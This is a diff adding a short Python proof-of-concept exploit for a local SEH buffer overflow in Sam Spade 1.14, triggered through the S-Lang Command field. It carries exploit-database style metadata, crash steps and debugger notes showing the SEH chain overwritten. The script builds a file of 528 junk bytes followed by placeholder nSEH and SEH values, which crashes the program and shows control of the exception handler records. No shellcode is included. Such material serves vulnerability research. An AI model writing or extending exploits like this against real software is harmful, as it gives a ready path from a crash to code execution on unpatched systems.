@@ -1,0 +1,32 @@
+#!/usr/bin/env python
+# Exploit Title     : Sam Spade 1.14 S-Lang Command Field SEH Overflow Crash PoC
+# Discovery by      : Nipun Jaswal
+# Email             : mail@nipunjaswal.info
+# Discovery Date    : 12/11/2015
+# Vendor Homepage   : http://samspade.org
+# Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html
+# Tested Version    : 1.14
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS      : Windows XP Professional SP2 x86 es
+# Crash Point       : Go to Tools > S-Lang Command> Enter the contents of 'sam_spade_slang_dos.txt' > OK , Note: Do Not Remove the round bracket
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+# And the Stack
+#00FBFE80   41414141  AAAA
+#00FBFE84   41414141  AAAA
+#00FBFE88   42424242  BBBB  Pointer to next SEH record
+#00FBFE8C   43434343  CCCC  SE handler
+
+# After the execution of POC, the SEH chain looks like this: 
+#Address    SE handler
+#00FBFE88   43434343
+#42424242   *** CORRUPT ENTRY ***
+
+f = open("sam_spade_slang_dos.txt", "w")
+Junk_a = "A"*528
+nseh= "B" * 4
+seh= "C" *4
+
+f.write(Junk_a+nseh+seh)
+f.close()
